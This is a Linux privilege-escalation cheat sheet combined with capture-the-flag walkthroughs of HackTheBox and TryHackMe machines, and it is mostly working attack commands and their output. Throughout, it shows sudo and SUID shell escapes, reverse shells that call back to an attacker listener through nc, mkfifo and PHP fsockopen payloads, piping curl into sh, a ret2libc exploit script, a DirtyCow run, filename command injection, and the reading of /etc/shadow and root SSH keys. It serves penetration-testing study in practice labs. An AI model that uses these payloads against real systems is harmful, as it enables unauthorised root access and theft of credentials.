
#### Resources
https://guif.re/linuxeop
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
https://book.hacktricks.xyz/linux-unix/privilege-escalation



```
cat /etc/issue
cat /etc/*-release
uname -a
cat /etc/passwd
cat /etc/group
ps -auxxx | grep root
dpkg -l
rpm -qa
find /etc/ -name *.conf
crontab -l
ls -alh /var/spool/cron
ls -al /etc/cron*
cat /etc/cron*
hostname
/sbin/ifconfig -a
/sbin/route
arp -a 
netstat -antup
sudo -l 2> /dev/null
cat /etc/sudoers
ls -ahl /root/
ls -ahl /home/
find /home/ -name authorized_keys 
find /home/ -name id_*
find /root/ -name authorized_keys 
find /root/ -name id_*
ls -lah /root/.ssh/
ls -alh /var/www/
echo "python -c 'import pty;pty.spawn("/bin/bash")'"
echo "echo os.system('/bin/bash')"
echo "/bin/sh -i"
cat /etc/fstab
find / -type f \( -perm -04000 -o -perm -02000 \) -exec ls -lh {} \; 2> /dev/null
which perl
which gcc
which g++
which python
which php
which cc
which go
which node
which wget
which nc
which netcat
which scp
which ftp
which tftp
which curl
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```

##### Bastardised from [fieldraccoon](https://github.com/fieldraccoon)

Running `sudo -l` returns a few options of things we can run so we will find a way to exploit each one:

```bash
kali@kali:~$ sudo -l

```
#### Exploiting file as sudo:
```bash
kali@kali:~$ sudo find /bin -name nano -exec /bin/sh \;
sh-4.1# whoami
root
```
#### Exploiting awk as sudo:
```bash
kali@kali:~$ sudo awk 'BEGIN {system("/bin/sh")}'
sh-4.1# whoami
root
```
#### Exploiting nmap:

```bash
kali@kali:~$ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse

Starting Nmap 5.00 ( http://nmap.org ) at 2020-06-30 10:18 EDT
sh-4.1# whoami
root
```

#### Exploiting vim as sudo:
```bash
:!sh
sh-4.1# whoami
root
```
#### Exploiting apache2 as sudo:

```bash
kali@kali:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::'
```

#### Crontab path exploit:

```bash
kali@kali:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

kali@kali:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
kali@kali:~$ chmod +x /home/user/overwrite.sh
kali@kali:~$ /tmp/bash -p
bash-4.1# whoami
root
```

#### little trick with crontab and getcap to get root:

```bash
kali@kali:~$ getcap -r / 2>/dev/null
kali@kali:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~#
```

#### Using SUID envoronment variables:

```bash
kali@kali:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
kali@kali:~$ gcc /tmp/service.c -o /tmp/service
kali@kali:~$  export PATH=/tmp:$PATH
kali@kali:~$ /usr/local/bin/suid-env
root@debian:~# whoami
root
```
we can also do:
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
bash-4.1# whoami
root
```

### exploiting systemctl to gain a root shell
```bash
kali@kali:~$ find / -perm -4000 2> /dev/null

/bin/systemctl
```
Here we can see that our find command has picked up the binary `systemctl`. we check permissions for it by doing `ls -la file` and it is running as root.

The genral idea of systemctl is that it turns linux services on and off. What we have to do is create a new service and start it. As it will be running as root the service is started as root.
```bash
kali@kali:~$ echo '[Service]' > fieldraccoon.service
kali@kali:~$ echo 'Type=oneshot' >> fieldraccoon.service
kali@kali:~$ echo 'ExecStart=/bin/nc -e /bin/bash 10.10.xx.xx 1234' >> fieldraccoon.service
kali@kali:~$ echo '[Install]' >> fieldraccoon.service
kali@kali:~$ echo 'WantedBy=multi-user.target' >> fieldraccoon.service
```
We make our service file by using some help on GTFObins And on the service section we execute a reverse shell which will point to a listener and gain us the shell.

```bash
kali@kali:~$ systemctl enable /home/pepper/fieldraccoon.service
```
On our listener:
```bash
nc -lvnp 1234
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.xx.xx
Ncat: Connection from 10.10.xx.xx:xxxx.
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
d41d8cd[redacted]
```


### tryhackme pentest box:

The most simlpe priv esc with `sudo -l` to show us we can run anything as root so we can simply su.

```bash
kay@basic2:~$ sudo -l
[sudo] password for kay:
Matching Defaults entries for kay on basic2:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
		(ALL : ALL) ALL
kay@basic2:~$ sudo su root
root@basic2:/home/kay# whoami
root
```

### openadmin htb - using nano to get a shell:

We run `sudo -l` as always when we are trying to priv esc to see if we can run anything as sudo.
```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
		(ALL) NOPASSWD: /bin/nano /opt/priv
```

In fact we can run something, we can use the text editor nano as root on teh file /opt/priv

We go on https://gtfobins.github.io/gtfobins/nano/ and read teh section on shell.
```bash
nano
^R^X
reset; sh 1>&0 2>&0
```
There are two ways of doing it from here.

1. We can either use nano on the file then `^R` and then simply type `/root/root.txt` and teh flag pops up.

2. Or we can get a shell by doing the above command involving `reset`.

```bash
Command to execute: reset; sh 1>&0 2>&0# ls
user.txte                                                                                                          ^X Read File
# cd /root
# ls
root.txt
# type root.txt
root.txt: not found
# cat root.txt
2f907ed450b361b2c2bf4e8795d5b561
```

### Exploiting logrotate with access logs - hack the box book

After running pspy we realise that logrotate is running as root.

After some reasearching we find a github that has an explpoit [exploit](https://github.com/whotwagner/logrotten).

Exploitation steps:

```bash
reader@book:~$ cd /tmp
reader@book:/tmp$ mkdir shell
reader@book:/tmp$ cd  shell
reader@book:/tmp/shell$ nano logrotten.c
reader@book:/tmp/shell$ gcc -o logrotten logrotten.c

reader@book:/tmp/shell$ nano payload
reader@book:/tmp/shell$ ./logrotten -p ./payload /home/reader/backups/access.log
Waiting for rotating /home/reader/backups/access.log...
```
payload file:
```php
php -r '$sock=fsockopen("10.10.xx.xx",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
we have to echo data to the logs file to make it rotate otherwise it wont do anything
```bash
reader@book:~/backups$ cat access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
reader@book:~/backups$ echo "hi" > access.log
```

Note that it took a few attempts.

Then we get a connection back on our shell:
```bash
kali@kali:~/boxes/book$ nc -nlvp 1234
listening on [any] 1234 ...

connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.176] 47712
#  cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCE.........
```

Then we can ssh as root and read the root flag.

```bash
kali@kali:~/boxes/book$ ssh -i root_rsa root@book.htb


root@book:~# cat /root/root.txt
84da92adf{...}
```

### using jjs to priv esc - hack the box mango

When we get a shell on the box we run `linenum.sh` to check for anything interesting.

We run it and grep for sh to see if we have any SUID binaries that we can exploit and indeed we get one.

```bash
admin@mango:/home/admin$ curl 10.10.14.11/LinEnum.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 46108  100 46108    0     0   229k      0 --:--:-- --:--:-- --:--:--  228k
-e
#########################################################
-e # Local Linux Enumeration & Privilege Escalation Script #
-e #########################################################
-e # www.rebootuser.com
-e # version 0.98
[...]
-e [+] Possibly interesting SUID files:
-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```
After a few simple searches we find that we can execute commands with jjs and treat like a shell.

We exploit it below:
```bash
admin@mango:/home/admin$ /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('cp /root/root.txt /tmp/fieldraccoon.txt').waitFor()
0
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod 777 /tmp/fieldraccoon.txt').waitFor()
0

jjs> admin@mango:/home/admin$ wc -c /tmp/fieldraccoon.txt
33 /tmp/fieldraccoon.txt
```
From this we can see that we succesfully copy the root flag into our tmp directory and are able to read it.

### exploiting viewuser - hack the box irked:

When we connect to the box with our shell we enumerate and find an SUID binary by the name of `viewuser by running this command:
```bash
find /usr/bin/ -perm -4000
```
This brings back `/usr/bin/viewuser`. we run the file to see what it is doing.
```bash
viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2018-12-19 15:14 (:0)
djmardov pts/0        2018-12-19 15:15 (10.10.12.35)
djmardov pts/1        2018-12-19 15:15 (10.10.15.82)
djmardov pts/2        2018-12-19 15:15 (10.10.13.138)
djmardov pts/4        2018-12-19 15:16 (10.10.15.233)
djmardov pts/5        2018-12-19 15:16 (10.10.16.28)
djmardov pts/8        2018-12-19 15:17 (10.10.15.147)
djmardov pts/10       2018-12-19 15:22 (10.10.12.115)
djmardov pts/11       2018-12-19 15:23 (10.10.19.221)
sh: 1: /tmp/listusers: Permission denied
```
We can see here that it is looking for the file `/tmp/listusers` to execute but it cannot find it. so we will try insert malicious code into that file to hope to get execution.
```bash
djmardov@irked:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f" > /tmp/listusers
djmardov@irked:/tmp$ chmod 777 listusers
djmardov@irked:/tmp$ /usr/bin/viewuser
```
After this we setup our listener and get a connection with a root shell. We could also add `cat /root/root.txt` to the file or add `/bin/bash`, either option gives us the root flag its just preference wether you want a shell or not.


### tryhackme lazy-admin box - sudo -l - perl priv-esc

```bash
www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

After checking the file `backup.pl` we can see that it is running this:
```bash
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
We check privelages for the copy.sh file and it turns out that we can write to it.

We add a reverse shell to the file and execute it as root and we get a shell.

```bash
www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh
< -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl
```
And we setup a listener on our box and we get a connection!
```bash
kali@kali:~/tryhackme$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.9.36.51] from (UNKNOWN) [10.10.87.188] 59192
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

## Other:

### Priv esc with mounting file system on docker:

Running `id` confirms that the user is part of a docker group, we will see if we can exploit this.

```bash
spanishdancer@ariekei:~$ id
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)
spanishdancer@ariekei:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
waf-template        latest              399c8876e9ae        2 years ago         628MB
bastion-template    latest              0df894ef4624        2 years ago         251MB
web-template        latest              b2a8f8d3ef38        2 years ago         185MB
bash                latest              a66dc6cea720        2 years ago         12.8MB
convert-template    latest              e74161aded79        4 years ago         418MB
```
It shows that the user is part of the docker gorup, this is often used because they give access to users in a dedicated group to run commands as root for docker as docker needs root privelages, this makes priv esc simple as we simply use the docker image as a template to priv esc

```bash
spanishdancer@ariekei:~$ docker run -v /:/rootexploit -i -t bash
bash-4.4# ls
bin          etc          lib          mnt          root         run          srv          tmp          var
dev          home         media        proc         rootexploit  sbin         sys          usr
bash-4.4# cd rootexploit
bash-4.4# ls
bin         dev         home        lib         lost+found  mnt         proc        run         snap        sys         usr         vmlinuz
boot        etc         initrd.img  lib64       media       opt         root        sbin        srv         tmp         var
bash-4.4# cd root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
0385b6629b30f8a673f7bb279fb1570b
bash-4.4#
```
### priv esc mounting backup image with password ciphertext key brute force -hack the box forward-slash:

When we enumerate we find a file where it seems to be the encryption method for a ciphertext. We can make a script to brute force this:
```python
ciphertext = open('ciphertext', 'r').read().rstrip()
for i in range(1, 165): # key length assuming that key is not greater than the length of encrypted ciphertext
    for j in range(33, 127): # from ! to ~ (including all A-Z,a-z and 0-9)
        key = chr(j) * i
        msg = decrypt(key, ciphertext)
        if 'the ' in msg or 'be ' in msg or 'and ' in msg or 'of ' in msg :
            exit("Key: {0}, Key length: {1}, Msg: {2}".format(key, len(key), msg))
```
When we run this we get a password along with a folder which we then take a loo at.
```bash
/var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
```
This is also visible when running `sudo -l`
```bash
User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```
So knowing the password we then mount it with:
```bash
sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
sudo /bin/mount /dev/mapper/backup ./mnt/
```
And then we can simply go the the mounted folder and find the root shh key inside, we then ssh as root and read the flag!


### Git show on git logs to reveal a private ssh key - devOops box htb

as we ssh we find that there is a git directory in `/home/roosa/work/blogfeed/.git` we run `git log` to see if we find anything interesting and luckily we do.
```bash
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

	reverted accidental commit with proper key
```
This means that the user had an old ssh key reverted(its the root ssh key) so we need to try and find a way to get this. We run `git show 33e87c312c08735a02fa9c796021a4a3023129ad `and it shows us the root key, We copy it to our box once again, give it appropriate permissions and ssh as root.

### simple ret2libc exploit to get a root shell

We find an SUID binary in /home/ayush/.binary, its called rop
we run it to see what it does, basically it just takes our input and outputs it.
We do:
```bash
./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
And we see that it returns a seg fault so we have a buffer overflow vulnerability.
We are going to do a ret2libc attack.
GDB is not installed on the box so we download a static version and then upload it via a metpreter session.
Theses are the exploitation steps:

```bash
on our box:
gdb-peda$ pattern_create -l 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb rop
break *main
run AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
c
we get an address below the line that says segfault.
gdb-peda$ pattern_offset -q address_we_got
we will get an offset of 52
```
This shows us that the buffer overflows at 52 chars
Now we need to get all the addresses so we will start with finding the /bin/sh in libc
```bash
www-data@frolic:/home/ayush/.binary$ ldd rop
				linux-gate.so.1 =>  (0xb7fda000)
				libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
				/lib/ld-linux.so.2 (0xb7fdb000)

www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15ba0b /bin/sh
Also in gdb we do "p system" and "p exit" to find the addresses for system and exit
 ```
So now we have all our addresses:
```python
libc = 0xb7e19000
offset = 0x0015ba0b
/bin/sh = libc + offset = 0xb7f74a0b
system = 0xb7e53da0
exit = 0xb7e479d0
```
Now we have everything we need lets construct our script
```python
#!/usr/bin/python

import struct

buf = "A" * 52
system = struct.pack("I" ,0xb7e53da0)
exit = struct.pack("I" ,0xb7e479d0)
shell = struct.pack("I" ,0xb7f74a0b)
print buf + system + exit + shell
```
Then we simply run This command to exploit the binary and get a root shell and read the root flag:
```
./rop `python /tmp/exploit.py`
```

### root shell via php file execution as root - htb cronos:

By running linenum.sh on the system we find an interesting file on it called `/etc/crontab`.

```bash
ww-data@cronos:/home/noulis$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

We can see that this file is being ran as root, lets see if we can exploit it.

We see that it is running `/var/www/laravel/artisan` as root with php meaning its a php file. Lets try and add a reverse shell to the file and see if it executes it.

```bash
kali@kali:~$ python -m SimpleHTTPServer 8081
Serving HTTP on 0.0.0.0 port 8081 ...
10.10.10.13 - - [27/Jun/2020 05:12:20] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```
We setup a python server to host our rev-shell file(which is edited to include our ip and port)
```bash
www-data@cronos:/tmp$ wget 10.10.14.7:8081/php-reverse-shell.php
wget 10.10.14.7:8081/php-reverse-shell.php
--2020-06-27 12:15:48--  http://10.10.14.7:8081/php-reverse-shell.php
Connecting to 10.10.14.7:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5492 (5.4K) [application/octet-stream]
Saving to: 'php-reverse-shell.php'

php-reverse-shell.p 100%[===================>]   5.36K  --.-KB/s    in 0.003s

2020-06-27 12:15:48 (1.63 MB/s) - 'php-reverse-shell.php' saved [5492/5492]

www-data@cronos:/tmp$

www-data@cronos:/var/www/laravel$ cp /tmp/php-reverse-shell.php artisan
cp /tmp/php-reverse-shell.php artisan
```
Now we just set up a listener on the specified port that we added in our shell file and wait for a connection.

```bash
kali@kali:~$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.13] 46434
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:18:01 up 24 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
1703b8a3c9a8dde879942c79d02fd3a0
```
### priv esc with journalctl -  hack the box traverxec root:

We find an interesting file in `bin` called `server-stats.sh` so we run it to see what its doing.

```bash
david@traverxec:~/bin$ bash server-stats.sh
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""'

Load:  00:38:38 up 1 day,  5:31,  2 users,  load average: 0.00, 0.00, 0.00

Open nhttpd sockets: 3
Files in the docroot: 117

Last 5 journal log lines:
-- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 00:38:38 EDT. --
Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=www-data
Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
```
we can see that it is outputting some kind of logs so we take a look at the file to see exactly what its doing.

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
We can see on the top line that it is reading the head for `server-stats` which is the ascii art and the copyright.

But at the bottom is the part that is running as root(sudo)
```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
This tells us that we can run `journalctl` as root.

We can do a quick search on gtfobins which tells us that we can use it to execute a shell if our window is minimal.
```bash
avid@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 01:14:31 EDT. --
Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=w
Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
!/bin/bash
root@traverxec:/home/david#
```
After the script has executed we type `!/bin/bash` which will give us a shell.

Overall this wasnt the greatest way to do this as without gtfobins it required pure guesswork as the shell wouldnt work if the window wasn't minimised.

### Using dirtycow

we can test to see if the kernel for that machine is vulnrable by running an exploit suggestor and if it comes up with dirty cow we can abuse it like this:
```bash
kali@kali:~$ ./c0w

	 (___)
	 (o o)_____/
		@@ `     \
		 \ ____, //usr/bin/passwd
		 //    //
		^^    ^^
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 9ca4000

madvise 0

ptrace 0

kali@kali:~$ whoami
TCM
kali@kali:~$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
kali@kali:~$ passwd
root@debian:/home/user# id && whoami
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root
```
### Using touch to make an executable file name - hack the box networed:

After gaining a shell we find a file which involves this interesting line:
```bash
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```
we can see that the variable holds the name of a file and if we name it in a specific way we can try and execute code with it.
```bash
touch ";nc ourip 1234 -c bash"
```
And then if we setup a listener on port 1234 with `nc -nlvp 1234` we get a connection back on our listener.

### priv esc with ssh-key cracking - tryhackme box

in this model priv esc we gain access to a user who can read other users ssh private keys but they are encrypted with a password. We crack the key with ssh2john and ssh into that user with the password it cracks.

```bash
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
jan@basic2:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ
o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN
XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX
AkAN+3T5FU49AEVKBJtZnLTEBw31mxjv0lLXAqIaX5QfeXMacIQOUWCHATlpVXmN
lG4BaG7cVXs1AmPieflx7uN4RuB9NZS4Zp0lplbCb4UEawX0Tt+VKd6kzh+Bk0aU
hWQJCdnb/U+dRasu3oxqyklKU2dPseU7rlvPAqa6y+ogK/woTbnTrkRngKqLQxMl
lIWZye4yrLETfc275hzVVYh6FkLgtOfaly0bMqGIrM+eWVoXOrZPBlv8iyNTDdDE
3jRjqbOGlPs01hAWKIRxUPaEr18lcZ+OlY00Vw2oNL2xKUgtQpV2jwH04yGdXbfJ
LYWlXxnJJpVMhKC6a75pe4ZVxfmMt0QcK4oKO1aRGMqLFNwaPxJYV6HauUoVExN7
bUpo+eLYVs5mo5tbpWDhi0NRfnGP1t6bn7Tvb77ACayGzHdLpIAqZmv/0hwRTnrb
RVhY1CUf7xGNmbmzYHzNEwMppE2i8mFSaVFCJEC3cDgn5TvQUXfh6CJJRVrhdxVy
VqVjsot+CzF7mbWm5nFsTPPlOnndC6JmrUEUjeIbLzBcW6bX5s+b95eFeceWMmVe
B0WhqnPtDtVtg3sFdjxp0hgGXqK4bAMBnM4chFcK7RpvCRjsKyWYVEDJMYvc87Z0
ysvOpVn9WnFOUdON+U4pYP6PmNU4Zd2QekNIWYEXZIZMyypuGCFdA0SARf6/kKwG
oHOACCK3ihAQKKbO+SflgXBaHXb6k0ocMQAWIOxYJunPKN8bzzlQLJs1JrZXibhl
VaPeV7X25NaUyu5u4bgtFhb/f8aBKbel4XlWR+4HxbotpJx6RVByEPZ/kViOq3S1
GpwHSRZon320xA4hOPkcG66JDyHlS6B328uViI6Da6frYiOnA4TEjJTPO5RpcSEK
QKIg65gICbpcWj1U4I9mEHZeHc0r2lyufZbnfYUr0qCVo8+mS8X75seeoNz8auQL
4DI4IXITq5saCHP4y/ntmz1A3Q0FNjZXAqdFK/hTAdhMQ5diGXnNw3tbmD8wGveG
VfNSaExXeZA39jOgm3VboN6cAXpz124Kj0bEwzxCBzWKi0CPHFLYuMoDeLqP/NIk
oSXloJc8aZemIl5RAH5gDCLT4k67wei9j/JQ6zLUT0vSmLono1IiFdsMO4nUnyJ3
z+3XTDtZoUl5NiY4JjCPLhTNNjAlqnpcOaqad7gV3RD/asml2L2kB0UT8PrTtt+S
baXKPFH0dHmownGmDatJP+eMrc6S896+HAXvcvPxlKNtI7+jsNTwuPBCNtSFvo19
l9+xxd55YTVo1Y8RMwjopzx7h8oRt7U+Y9N/BVtbt+XzmYLnu+3qOq4W2qOynM2P
nZjVPpeh+8DBoucB5bfXsiSkNxNYsCED4lspxUE4uMS3yXBpZ/44SyY8KEzrAzaI
fn2nnjwQ1U2FaJwNtMN5OIshONDEABf9Ilaq46LSGpMRahNNXwzozh+/LGFQmGjI
